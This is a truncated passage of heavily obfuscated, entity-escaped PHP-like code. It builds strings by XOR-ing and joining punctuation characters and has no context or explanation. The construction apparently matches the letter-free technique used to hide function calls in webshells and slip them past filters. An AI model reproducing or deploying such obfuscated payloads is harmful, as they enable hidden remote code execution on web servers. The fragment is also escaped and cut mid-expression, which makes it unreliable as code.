#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;).\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026